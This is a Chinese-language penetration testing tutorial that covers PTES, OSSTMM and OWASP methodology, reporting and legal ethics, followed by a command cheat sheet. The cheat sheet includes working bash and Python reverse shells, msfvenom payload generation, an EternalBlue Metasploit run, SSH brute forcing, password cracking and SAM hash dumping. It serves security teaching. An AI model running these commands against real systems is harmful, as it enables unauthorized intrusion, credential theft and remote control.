---
order: 220
title: 渗透测试方法论
module: 'cybersecurity'
category: 云与基础设施
difficulty: advanced
description: 渗透测试方法论：PTES标准、OSSTMM、攻击流程与报告编写详解。
author: fanquanpp
updated: '2026-08-30'
related:
  - 'cybersecurity/020-DigitalCertificate'
  - 'cybersecurity/021-HTTPSPrinciple'
  - 'cybersecurity/023-InformationGathering'
  - 'cybersecurity/024-VulnerabilityScan'
prerequisites:
  - 'cybersecurity/001-SecurityBasicsDefense'
---

## 1. 渗透测试标准

### 1.1 PTES 七阶段

| 阶段 | 名称     | 描述                 |
| ---- | -------- | -------------------- |
| 1    | 前期交互 | 确定范围、目标、规则 |
| 2    | 信息收集 | 被动/主动侦察        |
| 3    | 威胁建模 | 识别攻击路径         |
| 4    | 漏洞分析 | 发现和验证漏洞       |
| 5    | 渗透攻击 | 利用漏洞获取访问     |
| 6    | 后渗透   | 权限提升、横向移动   |
| 7    | 报告编写 | 整理发现与建议       |

### 1.2 OSSTMM

开放安全测试方法论（Open Source Security Testing Methodology Manual）：

- 科学化测试方法
- 可量化风险评估
- 五大通道：人力、物理、无线、电信、数据网络

### 1.3 OWASP 测试指南

| 阶段     | 测试项             |
| -------- | ------------------ |
| 信息收集 | 基础设施、技术栈   |
| 配置管理 | 服务器配置、日志   |
| 身份认证 | 密码策略、会话管理 |
| 授权     | 权限控制、越权     |
| 输入验证 | 注入、XSS          |
| 业务逻辑 | 流程绕过           |

## 2. 渗透测试流程

### 2.1 前期交互

**关键文档**：

| 文档     | 内容                   |
| -------- | ---------------------- |
| 授权书   | 书面授权，明确测试范围 |
| 规则约定 | 测试时间、禁止行为     |
| 范围定义 | IP 段、域名、应用      |
| 紧急联系 | 出现问题时联系谁       |

### 2.2 信息收集

**被动信息收集**：

| 技术       | 工具          | 获取信息        |
| ---------- | ------------- | --------------- |
| DNS 枚举   | dig, nslookup | 子域名、MX 记录 |
| WHOIS      | whois         | 注册信息        |
| 搜索引擎   | Google Dork   | 敏感文件、目录  |
| 证书透明度 | crt.sh        | 子域名          |
| 网络空间   | Shodan, FOFA  | 开放服务        |
| 社交媒体   | OSINT         | 员工信息        |

**主动信息收集**：

| 技术     | 工具                | 获取信息       |
| -------- | ------------------- | -------------- |
| 端口扫描 | Nmap                | 开放端口、服务 |
| 服务识别 | Nmap -sV            | 服务版本       |
| 操作系统 | Nmap -O             | OS 类型        |
| Web 指纹 | Wappalyzer          | 技术栈         |
| 目录扫描 | dirsearch, gobuster | 隐藏路径       |

### 2.3 漏洞分析

```
1. 自动化扫描 → 发现潜在漏洞
2. 手动验证 → 确认漏洞真实性
3. 漏洞分级 → 评估影响程度
4. 组合利用 → 构建攻击链
```

### 2.4 渗透攻击

**方法论**：

```
1. 选择漏洞 → 匹配目标环境
2. 准备 Exploit → 适配目标版本
3. 执行攻击 → 获取初始访问
4. 验证结果 → 确认权限级别
```

**常用工具**：

| 工具          | 用途         |
| ------------- | ------------ |
| Metasploit    | 综合渗透框架 |
| Burp Suite    | Web 渗透     |
| sqlmap        | SQL 注入     |
| Cobalt Strike | 高级后渗透   |

### 2.5 后渗透

| 活动     | 描述                      |
| -------- | ------------------------- |
| 权限提升 | 本地提权（Linux/Windows） |
| 横向移动 | 内网渗透                  |
| 数据收集 | 敏感数据定位              |
| 持久化   | 后门植入                  |
| 痕迹清理 | 日志清除                  |

## 3. 渗透测试类型

### 3.1 按知识分类

| 类型 | 测试者信息 | 模拟场景   |
| ---- | ---------- | ---------- |
| 黑盒 | 无任何信息 | 外部攻击者 |
| 白盒 | 完全信息   | 内部人员   |
| 灰盒 | 部分信息   | 内部威胁   |

### 3.2 按位置分类

| 类型     | 描述         |
| -------- | ------------ |
| 外部测试 | 从互联网发起 |
| 内部测试 | 从内网发起   |
| 物理测试 | 物理安全评估 |

## 4. 报告编写

### 4.1 报告结构

```
1. 执行摘要（管理层）
2. 测试范围与方法
3. 发现摘要（风险矩阵）
4. 详细发现
   - 漏洞描述
   - 复现步骤
   - 证据截图
   - 风险评级
   - 修复建议
5. 附录
```

### 4.2 风险评级

**CVSS 评分**：

| 评级 | CVSS 分数 | 描述       |
| ---- | --------- | ---------- |
| 严重 | 9.0-10.0  | 立即修复   |
| 高危 | 7.0-8.9   | 尽快修复   |
| 中危 | 4.0-6.9   | 计划修复   |
| 低危 | 0.1-3.9   | 可接受风险 |
| 信息 | 0         | 仅供参考   |

### 4.3 修复优先级

```
1. 互联网暴露的严重/高危漏洞 → 立即
2. 内网高危漏洞 → 48 小时内
3. 中危漏洞 → 1 周内
4. 低危漏洞 → 下次迭代
```

## 5. 法律与道德

### 5.1 法律要求

- 必须获得书面授权
- 遵守测试范围
- 不得超出授权行为
- 保护获取的数据

### 5.2 职业道德

- 保密客户信息
- 如实报告发现
- 不隐瞒漏洞
- 不植入后门
- 及时报告紧急漏洞
## 信息收集

**基本写法:DNS 枚举**
`dig any <域名>`
```bash
# 查询域名所有 DNS 记录
dig any example.com
```

**基本写法:子域名枚举**
`subfinder -d <域名>`
```bash
# 使用 subfinder 枚举子域名
subfinder -d example.com -o subdomains.txt
```

**基本写法:DNS 区域传送测试**
`dig axfr @<DNS服务器> <域名>`
```bash
# 测试 DNS 区域传送是否允许
dig axfr @ns1.example.com example.com
```

**基本写法:Whois 查询**
`whois <域名>`
```bash
# 查询域名注册信息
whois example.com
```

**基本写法:搜索引擎语法**
`site:<域名> intitle:"index of"`
```bash
# 使用 Google Hacking 查找敏感信息
site:example.com intitle:"index of" -inurl:(html|php)
```

---

## 端口扫描

**基本写法:nmap 基础扫描**
`nmap -sV <目标>`
```bash
# 扫描目标开放端口与服务版本
nmap -sV 192.168.1.10
```

**基本写法:快速端口扫描**
`nmap -T4 -F <目标>`
```bash
# 快速扫描常用端口
nmap -T4 -F 192.168.1.10
```

**基本写法:全端口扫描**
`nmap -p- -T4 <目标>`
```bash
# 扫描所有 65535 个端口
nmap -p- -T4 192.168.1.10
```

**基本写法:UDP 端口扫描**
`nmap -sU --top-ports <数量> <目标>`
```bash
# 扫描常用 UDP 端口
sudo nmap -sU --top-ports 100 192.168.1.10
```

**基本写法:操作系统识别**
`nmap -O <目标>`
```bash
# 识别目标操作系统
sudo nmap -O 192.168.1.10
```

**基本写法:漏洞脚本扫描**
`nmap --script vuln <目标>`
```bash
# 使用 nmap 漏洞脚本扫描
nmap --script vuln 192.168.1.10
```

---

## 服务枚举

**基本写法:SMB 枚举**
`enum4linux <目标>`
```bash
# 枚举 SMB 共享与用户信息
enum4linux -a 192.168.1.10
```

**基本写法:NFS 枚举**
`showmount -e <目标>`
```bash
# 查看 NFS 导出的目录
showmount -e 192.168.1.10
```

**基本写法:SSH 枚举**
`nmap --script ssh-* -p 22 <目标>`
```bash
# 使用 nmap SSH 脚本枚举
nmap --script ssh-* -p 22 192.168.1.10
```

**基本写法:SNMP 枚举**
`snmpwalk -c public -v1 <目标>`
```bash
# 枚举 SNMP 信息
snmpwalk -c public -v1 192.168.1.10
```

**基本写法:LDAP 枚举**
`ldapsearch -x -H ldap://<目标> -b <基准DN>`
```bash
# 枚举 LDAP 目录信息
ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com"
```

---

## Web 应用测试

**基本写法:目录爆破**
`gobuster dir -u <URL> -w <字典>`
```bash
# 使用 gobuster 爆破 Web 目录
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
```

**基本写法:子域名爆破**
`gobuster dns -d <域名> -w <字典>`
```bash
# 爆破子域名
gobuster dns -d example.com -w subdomains.txt
```

**基本写法:Nikto 漏洞扫描**
`nikto -h <URL>`
```bash
# 使用 Nikto 扫描 Web 漏洞
nikto -h https://example.com
```

**基本写法:SQL 注入测试**
`sqlmap -u <URL> --dbs`
```bash
# 使用 sqlmap 测试 SQL 注入
sqlmap -u "https://example.com/page?id=1" --dbs
```

**基本写法:XSS 检测**
`dalfox url <URL>`
```bash
# 使用 dalfox 检测 XSS 漏洞
dalfox url "https://example.com/search?q=test"
```

**基本写法:WordPress 扫描**
`wpscan --url <URL>`
```bash
# 扫描 WordPress 站点
wpscan --url https://example.com --enumerate u
```

---

## 漏洞利用

**基本写法:搜索漏洞**
`searchsploit <关键字>`
```bash
# 在 exploitdb 中搜索漏洞利用
searchsploit apache 2.4
```

**基本写法:查看漏洞详情**
`searchsploit -x <漏洞ID>`
```bash
# 查看漏洞利用代码详情
searchsploit -x 12345
```

**基本写法:复制漏洞利用代码**
`searchsploit -m <漏洞ID>`
```bash
# 复制漏洞利用代码到当前目录
searchsploit -m 12345
```

**基本写法:使用 Metasploit**
`msfconsole -q -x "use <模块>; set RHOSTS <目标>; run"`
```bash
# 使用 Metasploit 利用漏洞
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; run"
```

**基本写法:生成 Payload**
`msfvenom -p <payload> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 生成反向连接 Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

---

## 密码破解

**基本写法:使用 hashcat 破解**
`hashcat -m <类型> <哈希> <字典>`
```bash
# 使用 hashcat 破解 MD5 哈希(类型 0)
hashcat -m 0 hash.txt rockyou.txt
```

**基本写法:使用 john 破解**
`john --wordlist=<字典> <哈希文件>`
```bash
# 使用 John the Ripper 破解密码
john --wordlist=rockyou.txt hashes.txt
```

**基本写法:破解 zip 密码**
`john --wordlist=<字典> <zip2john输出>`
```bash
# 破解 ZIP 文件密码
zip2john protected.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

**基本写法:在线哈希查询**
`curl "https://hashtoolkit.com/reverse-hash?hash=<哈希>"`
```bash
# 在线查询哈希明文
curl "https://hashtoolkit.com/reverse-hash?hash=098f6bcd4621d373cade4e832627b4f6"
```

**基本写法:SSH 密码爆破**
`hydra -l <用户> -P <字典> ssh://<目标>`
```bash
# 使用 hydra 爆破 SSH
hydra -l root -P passwords.txt ssh://192.168.1.10
```

---

## 后渗透操作

**基本写法:建立反弹 shell**
`bash -i >& /dev/tcp/<攻击IP>/<端口> 0>&1`
```bash
# 通过 bash 反弹 shell 到攻击机
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```

**基本写法:Python 反弹 shell**
`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<端口>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'`
```bash
# Python 反弹 shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'
```

**基本写法:升级交互式 shell**
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
```bash
# 升级为交互式 shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**基本写法:端口转发**
`ssh -L <本地端口>:<目标>:<目标端口> <用户>@<跳板>`
```bash
# SSH 本地端口转发
ssh -L 8080:192.168.2.10:80 user@192.168.1.10
```

**基本写法:动态端口转发**
`ssh -D <本地端口> <用户>@<跳板>`
```bash
# SSH 动态端口转发建立 SOCKS 代理
ssh -D 1080 user@192.168.1.10
```

---

## 权限提升

**基本写法:查找 SUID 文件**
`find / -perm -4000 -type f 2>/dev/null`
```bash
# 查找 SUID 权限文件用于提权
find / -perm -4000 -type f 2>/dev/null
```

**基本写法:查看 sudo 权限**
`sudo -l`
```bash
# 查看当前用户 sudo 权限
sudo -l
```

**基本写法:使用 LinPEAS 枚举**
`./linpeas.sh`
```bash
# 运行 LinPEAS 自动枚举提权路径
./linpeas.sh | grep -i "suid\|sudo\|writable"
```

**基本写法:查看内核版本**
`uname -r`
```bash
# 查看内核版本查找内核漏洞
uname -r
```

**基本写法:查看计划任务**
`cat /etc/crontab`
```bash
# 查看系统计划任务寻找提权点
cat /etc/crontab
```

---

## 内网渗透

**基本写法:内网存活主机探测**
`nmap -sn <网段>`
```bash
# Ping 扫描探测存活主机
nmap -sn 192.168.1.0/24
```

**基本写法:使用 Proxychains**
`proxychains <命令>`
```bash
# 通过 SOCKS 代理执行命令
proxychains nmap -sT -Pn 192.168.2.0/24
```

**基本写法:搭建 SOCKS 代理**
`ssh -D <端口> <用户>@<跳板> -fN`
```bash
# 使用 SSH 建立后台 SOCKS 代理
ssh -D 1080 user@192.168.1.10 -fN
```

**基本写法:内网端口扫描**
`nmap -sT -Pn -n --top-ports 100 <网段>`
```bash
# 通过代理扫描内网常用端口
proxychains nmap -sT -Pn -n --top-ports 100 192.168.2.0/24
```

**基本写法:Windows 凭据收集**
`secretsdump.py -local <文件>`
```bash
# 使用 impacket 导出 SAM 哈希
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## 报告生成

**基本写法:生成扫描报告**
`nmap -sV <目标> -oX <输出文件>`
```bash
# 输出 XML 格式扫描报告
nmap -sV 192.168.1.10 -oX scan_report.xml
```

**基本写法:转换为 HTML 报告**
`xsltproc <XML文件> -o <HTML文件>`
```bash
# 将 nmap XML 报告转为 HTML
xsltproc scan_report.xml -o report.html
```

**基本写法:整合多种扫描结果**
`python3 -c "import xml.etree.ElementTree as ET; ..."`
```bash
# 解析多个工具的扫描结果整合报告
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scan_report.xml')
for host in tree.findall('host'):
    print(host.find('address').get('addr'))
"
```

**基本写法:生成渗透测试报告**
`pandoc <输入> -o <输出>`
```bash
# 使用 pandoc 生成 PDF 报告
pandoc report.md -o pentest_report.pdf --pdf-engine=xelatex
```

**基本写法:导出漏洞清单**
`grep -E "CVE|OSVDB" <报告> > <漏洞清单>`
```bash
# 提取所有漏洞编号
grep -E "CVE-[0-9]+-[0-9]+|OSVDB" scan_report.txt > vulnerabilities.txt
```
